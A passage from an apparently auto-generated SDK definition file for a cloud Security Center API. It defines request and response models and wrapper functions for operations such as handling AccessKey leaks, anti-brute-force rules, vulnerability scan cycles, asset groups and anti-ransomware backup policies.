  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListVulGlobalConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the global configurations of vulnerability detection.
 *
 * @param request ListVulGlobalConfigRequest
 * @return ListVulGlobalConfigResponse
 */
async function listVulGlobalConfig(request: ListVulGlobalConfigRequest): ListVulGlobalConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listVulGlobalConfigWithOptions(request, runtime);
}

model MarkMonitorAccountsRequest {
  accountIds?: string(name='AccountIds', description='The IDs of the members.

This parameter is required.', example='131331822340XXXX,140649175187XXXX'),
}

model MarkMonitorAccountsResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model MarkMonitorAccountsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: MarkMonitorAccountsResponseBody(name='body'),
}

/**
 * @summary Marks members for multi-account management. You can call this operation to mark selected members as followed. In the Security Center console, the drop-down list above the left-side navigation pane displays the followed members.
 *
 * @param request MarkMonitorAccountsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return MarkMonitorAccountsResponse
 */
async function markMonitorAccountsWithOptions(request: MarkMonitorAccountsRequest, runtime: Util.RuntimeOptions): MarkMonitorAccountsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.accountIds)) {
    query['AccountIds'] = request.accountIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'MarkMonitorAccounts',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Marks members for multi-account management. You can call this operation to mark selected members as followed. In the Security Center console, the drop-down list above the left-side navigation pane displays the followed members.
 *
 * @param request MarkMonitorAccountsRequest
 * @return MarkMonitorAccountsResponse
 */
async function markMonitorAccounts(request: MarkMonitorAccountsRequest): MarkMonitorAccountsResponse {
  var runtime = new Util.RuntimeOptions{};
  return markMonitorAccountsWithOptions(request, runtime);
}

model ModifyAccessKeyLeakDealRequest {
  id?: long(name='Id', description='The ID of the AccessKey pair leak.

> You can call the [DescribeAccesskeyLeakList](~~DescribeAccesskeyLeakList~~) operation to query the ID. You must specify at least one of the Id and **IdList** parameters.', example='123'),
  idList?: [ long ](name='IdList', description='The IDs of AccessKey pair leaks.'),
  remark?: string(name='Remark', description='The remarks that are added.', example='disabled.'),
  type?: string(name='Type', description='The method to handle the AccessKey pair leak. Valid values:

*   **manual**: manually handle
*   **disable**: disable
*   **add-whitelist**: add to the whitelist

This parameter is required.', example='disable'),
}

model ModifyAccessKeyLeakDealResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DD4617B4-133A-53C8-ADAE-7B30FF89****'),
}

model ModifyAccessKeyLeakDealResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyAccessKeyLeakDealResponseBody(name='body'),
}

/**
 * @summary Handles AccessKey pair leaks.
 *
 * @param request ModifyAccessKeyLeakDealRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyAccessKeyLeakDealResponse
 */
async function modifyAccessKeyLeakDealWithOptions(request: ModifyAccessKeyLeakDealRequest, runtime: Util.RuntimeOptions): ModifyAccessKeyLeakDealResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.idList)) {
    query['IdList'] = request.idList;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAccessKeyLeakDeal',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Handles AccessKey pair leaks.
 *
 * @param request ModifyAccessKeyLeakDealRequest
 * @return ModifyAccessKeyLeakDealResponse
 */
async function modifyAccessKeyLeakDeal(request: ModifyAccessKeyLeakDealRequest): ModifyAccessKeyLeakDealResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAccessKeyLeakDealWithOptions(request, runtime);
}

model ModifyAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule', description='Specifies whether to set the defense rule as the default rule. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  failCount?: int32(name='FailCount', description='The threshold of logon failures that you specify. Valid values:

*   **2**
*   **3**
*   **4**
*   **5**
*   **10**
*   **50**
*   **80**
*   **100**', example='10'),
  forbiddenTime?: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes. Valid values:

*   **5**
*   **15**
*   **30**
*   **60**
*   **120**
*   **360**
*   **720**
*   **1440**
*   **10080**
*   **52560000**: permanent', example='5'),
  id?: long(name='Id', description='The ID of the defense rule.

This parameter is required.', example='65778'),
  name?: string(name='Name', description='The name of the defense rule.', example='TestRule'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  span?: int32(name='Span', description='The period of time during which logon failures from an account are measured. Unit: minutes. Valid values:

*   **1**
*   **2**
*   **5**
*   **10**
*   **15**', example='1'),
  uuidList?: [ string ](name='UuidList', description='An array consisting of the UUIDs of the servers to which the defense rule is applied.', example='uuid-13213-dasda'),
}

model ModifyAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model ModifyAntiBruteForceRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyAntiBruteForceRuleResponseBody(name='body'),
}

/**
 * @summary Modifies a defense rule against brute-force attacks.
 *
 * @param request ModifyAntiBruteForceRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyAntiBruteForceRuleResponse
 */
async function modifyAntiBruteForceRuleWithOptions(request: ModifyAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): ModifyAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defaultRule)) {
    query['DefaultRule'] = request.defaultRule;
  }
  if (!Util.isUnset(request.failCount)) {
    query['FailCount'] = request.failCount;
  }
  if (!Util.isUnset(request.forbiddenTime)) {
    query['ForbiddenTime'] = request.forbiddenTime;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.span)) {
    query['Span'] = request.span;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a defense rule against brute-force attacks.
 *
 * @param request ModifyAntiBruteForceRuleRequest
 * @return ModifyAntiBruteForceRuleResponse
 */
async function modifyAntiBruteForceRule(request: ModifyAntiBruteForceRuleRequest): ModifyAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAntiBruteForceRuleWithOptions(request, runtime);
}

model ModifyAppVulScanCycleRequest {
  cycle?: string(name='Cycle', description='The scan cycle for application vulnerabilities.

*   1week
*   2weeks
*   3days', example='1week'),
}

model ModifyAppVulScanCycleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='AFEDC54D-70A2-5E56-A69B-E3D8AA8A5197'),
}

model ModifyAppVulScanCycleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyAppVulScanCycleResponseBody(name='body'),
}

/**
 * @summary Configures a scan cycle for application vulnerabilities.
 *
 * @param request ModifyAppVulScanCycleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyAppVulScanCycleResponse
 */
async function modifyAppVulScanCycleWithOptions(request: ModifyAppVulScanCycleRequest, runtime: Util.RuntimeOptions): ModifyAppVulScanCycleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cycle)) {
    query['Cycle'] = request.cycle;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAppVulScanCycle',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Configures a scan cycle for application vulnerabilities.
 *
 * @param request ModifyAppVulScanCycleRequest
 * @return ModifyAppVulScanCycleResponse
 */
async function modifyAppVulScanCycle(request: ModifyAppVulScanCycleRequest): ModifyAppVulScanCycleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAppVulScanCycleWithOptions(request, runtime);
}

model ModifyAssetCleanConfigRequest {
  assetCleanConfigs?: [ 
    {
      cleanDays?: int32(name='CleanDays', description='The number of days before hosts whose provider cannot be identified are automatically cleaned after they enter the offline state. Valid value: an integer that ranges from 1 to 30.', example='7'),
      status?: int32(name='Status', description='Specifies whether to enable the feature of cleaning the offline hosts whose provider cannot be identified. Valid values:

*   **0**: disables the feature.
*   **1**: enables the feature.', example='1'),
      type?: int32(name='Type', description='The type of hosts that you want to clean.

Set the value to **1**, which indicates hosts whose provider cannot be identified.', example='1'),
    }
  ](name='AssetCleanConfigs', description='The asset cleanup configurations.'),
}

model ModifyAssetCleanConfigResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='952776BD-5546-59FC-8AF3-B54EBAD57***'),
}

model ModifyAssetCleanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyAssetCleanConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the configurations for cleaning offline hosts whose provider cannot be identified.
 *
 * @param request ModifyAssetCleanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyAssetCleanConfigResponse
 */
async function modifyAssetCleanConfigWithOptions(request: ModifyAssetCleanConfigRequest, runtime: Util.RuntimeOptions): ModifyAssetCleanConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetCleanConfigs)) {
    query['AssetCleanConfigs'] = request.assetCleanConfigs;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAssetCleanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configurations for cleaning offline hosts whose provider cannot be identified.
 *
 * @param request ModifyAssetCleanConfigRequest
 * @return ModifyAssetCleanConfigResponse
 */
async function modifyAssetCleanConfig(request: ModifyAssetCleanConfigRequest): ModifyAssetCleanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAssetCleanConfigWithOptions(request, runtime);
}

model ModifyAssetGroupRequest {
  groupId?: long(name='GroupId', description='The ID of the new server group to which the servers belong.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.

This parameter is required.', example='9586199'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers for which you want to change the server group. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='076a446d-df7d-424c-bdc5-bb5dc7f1****'),
}

model ModifyAssetGroupResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C2677612-7207-4AEB-BD48-8BA528F86777'),
}

model ModifyAssetGroupResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyAssetGroupResponseBody(name='body'),
}

/**
 * @summary Changes the server group to which specified servers belong.
 *
 * @description You can call the ModifyAssetGroup operation to change the server group to which one or more servers belong. After you create a server group by calling the [CreateOrUpdateAssetGroup](~~CreateOrUpdateAssetGroup~~) operation, you can call the ModifyAssetGroup operation to change the server group to which your servers belong.
 * ### Limits
 * You can call this API operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
 *
 * @param request ModifyAssetGroupRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyAssetGroupResponse
 */
async function modifyAssetGroupWithOptions(request: ModifyAssetGroupRequest, runtime: Util.RuntimeOptions): ModifyAssetGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAssetGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Changes the server group to which specified servers belong.
 *
 * @description You can call the ModifyAssetGroup operation to change the server group to which one or more servers belong. After you create a server group by calling the [CreateOrUpdateAssetGroup](~~CreateOrUpdateAssetGroup~~) operation, you can call the ModifyAssetGroup operation to change the server group to which your servers belong.
 * ### Limits
 * You can call this API operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
 *
 * @param request ModifyAssetGroupRequest
 * @return ModifyAssetGroupResponse
 */
async function modifyAssetGroup(request: ModifyAssetGroupRequest): ModifyAssetGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAssetGroupWithOptions(request, runtime);
}

model ModifyAssetImportantRequest {
  importantCode?: int32(name='ImportantCode', description='The importance of the asset. Valid values:

*   **0**: test
*   **1**: normal
*   **2**: important', example='0'),
  uuidList?: string(name='UuidList', description='The UUIDs of servers. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='076a446d-df7d-424c-bdc5-bb5dc7f1****'),
}

model ModifyAssetImportantResponseBody = {
  errCode?: string(name='ErrCode', description='The error code returned if the request failed.', example='ServerError'),
  errMessage?: string(name='ErrMessage', description='The error message returned if the request failed.', example='ServerError'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned. The value 200 indicates that the request was successful.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='23C85959-1540-514B-93CF-2992C53A1B4F'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyAssetImportantResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyAssetImportantResponseBody(name='body'),
}

/**
 * @summary Modifies the importance of an asset.
 *
 * @param request ModifyAssetImportantRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyAssetImportantResponse
 */
async function modifyAssetImportantWithOptions(request: ModifyAssetImportantRequest, runtime: Util.RuntimeOptions): ModifyAssetImportantResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.importantCode)) {
    query['ImportantCode'] = request.importantCode;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAssetImportant',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the importance of an asset.
 *
 * @param request ModifyAssetImportantRequest
 * @return ModifyAssetImportantResponse
 */
async function modifyAssetImportant(request: ModifyAssetImportantRequest): ModifyAssetImportantResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAssetImportantWithOptions(request, runtime);
}

model ModifyAttestorRequest {
  keyId?: string(name='KeyId', description='The ID of the KMS key.', example='key-********'),
  keyRegionId?: string(name='KeyRegionId', description='The region ID of the Key Management Service (KMS) key.', example='cn-hangzhou'),
  keyVersionId?: string(name='KeyVersionId', description='The version ID of the KMS key.', example='key-****'),
  name?: string(name='Name', description='The name of the witness.', example='attestor-auto-ad5316'),
  remark?: string(name='Remark', description='The description.', example='remark'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model ModifyAttestorResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='9E8B1D8F-DE1C-5421-81AA-**********'),
}

model ModifyAttestorResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyAttestorResponseBody(name='body'),
}

/**
 * @summary Modifies the information about a witness that is created by using the container signature feature.
 *
 * @param request ModifyAttestorRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyAttestorResponse
 */
async function modifyAttestorWithOptions(request: ModifyAttestorRequest, runtime: Util.RuntimeOptions): ModifyAttestorResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.keyId)) {
    query['KeyId'] = request.keyId;
  }
  if (!Util.isUnset(request.keyRegionId)) {
    query['KeyRegionId'] = request.keyRegionId;
  }
  if (!Util.isUnset(request.keyVersionId)) {
    query['KeyVersionId'] = request.keyVersionId;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAttestor',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the information about a witness that is created by using the container signature feature.
 *
 * @param request ModifyAttestorRequest
 * @return ModifyAttestorResponse
 */
async function modifyAttestor(request: ModifyAttestorRequest): ModifyAttestorResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAttestorWithOptions(request, runtime);
}

model ModifyAutoDelConfigRequest {
  days?: int32(name='Days', description='The number of days after which a detected vulnerability is automatically deleted. Unit: days. Valid values:

*   7
*   30
*   90', example='30'),
}

model ModifyAutoDelConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='3BFA659D-F44F-5703-8FD1-33AB596BEACA'),
}

model ModifyAutoDelConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyAutoDelConfigResponseBody(name='body'),
}

/**
 * @summary Specifies the number of days after which a detected vulnerability is automatically deleted.
 *
 * @param request ModifyAutoDelConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyAutoDelConfigResponse
 */
async function modifyAutoDelConfigWithOptions(request: ModifyAutoDelConfigRequest, runtime: Util.RuntimeOptions): ModifyAutoDelConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.days)) {
    query['Days'] = request.days;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAutoDelConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Specifies the number of days after which a detected vulnerability is automatically deleted.
 *
 * @param request ModifyAutoDelConfigRequest
 * @return ModifyAutoDelConfigResponse
 */
async function modifyAutoDelConfig(request: ModifyAutoDelConfigRequest): ModifyAutoDelConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAutoDelConfigWithOptions(request, runtime);
}

model ModifyBackupPolicyRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy that you want to modify.

This parameter is required.', example='11'),
  name?: string(name='Name', description='The name of the anti-ransomware policy that you want to modify.

This parameter is required.', example='policy_name_A'),
  policy?: map[string]any(name='Policy', description='The configurations of the anti-ransomware policy that you want to modify. The value is a JSON string that contains the following fields:

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to brackets [].

*   **Include**: the format of the file that you want to protect. Examples: \\\\*.jpg and \\\\*.doc.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. You can call the DescribeExcludeSystemPath operation to query all directories and then specify the directory that you want to exclude. Example: /home/user.

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour.

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is executed at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is executed at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: day. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 12:15:15360|6:12:5120, the maximum bandwidth for a data backup task is 15 Mbit/s from 12:00 to 15:00 and 5 Mbit/s from 06:00 to 12:00.

If you back up data on an Elastic Compute Service (ECS) instance that is connected over an internal network, we recommend that you leave this field empty. If this field is left empty, the bandwidth for data backup tasks is unlimited.

This parameter is required.', example='{"Source":["home","admin"]}'),
  policyRegionId?: string(name='PolicyRegionId', description='The region ID of the server to which the anti-ransomware policy is applied.

You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the regions in which the anti-ransomware feature is supported.', example='cn-hangzhou'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies.

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.

This parameter is required.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model ModifyBackupPolicyShrinkRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy that you want to modify.

This parameter is required.', example='11'),
  name?: string(name='Name', description='The name of the anti-ransomware policy that you want to modify.

This parameter is required.', example='policy_name_A'),
  policyShrink?: string(name='Policy', description='The configurations of the anti-ransomware policy that you want to modify. The value is a JSON string that contains the following fields:

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to brackets [].

*   **Include**: the format of the file that you want to protect. Examples: \\\\*.jpg and \\\\*.doc.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. You can call the DescribeExcludeSystemPath operation to query all directories and then specify the directory that you want to exclude. Example: /home/user.

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour.

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is executed at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is executed at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: day. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 12:15:15360|6:12:5120, the maximum bandwidth for a data backup task is 15 Mbit/s from 12:00 to 15:00 and 5 Mbit/s from 06:00 to 12:00.

If you back up data on an Elastic Compute Service (ECS) instance that is connected over an internal network, we recommend that you leave this field empty. If this field is left empty, the bandwidth for data backup tasks is unlimited.

This parameter is required.', example='{"Source":["home","admin"]}'),
  policyRegionId?: string(name='PolicyRegionId', description='The region ID of the server to which the anti-ransomware policy is applied.

You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the regions in which the anti-ransomware feature is supported.', example='cn-hangzhou'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies.

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.

This parameter is required.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model ModifyBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model ModifyBackupPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyBackupPolicyResponseBody(name='body'),
}

/**
 * @summary Modifies an anti-ransomware policy.
 *
 * @param tmpReq ModifyBackupPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyBackupPolicyResponse
 */
async function modifyBackupPolicyWithOptions(tmpReq: ModifyBackupPolicyRequest, runtime: Util.RuntimeOptions): ModifyBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.policy)) {
    request.policyShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.policy, 'Policy', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policyShrink)) {
    query['Policy'] = request.policyShrink;
  }
  if (!Util.isUnset(request.policyRegionId)) {
    query['PolicyRegionId'] = request.policyRegionId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
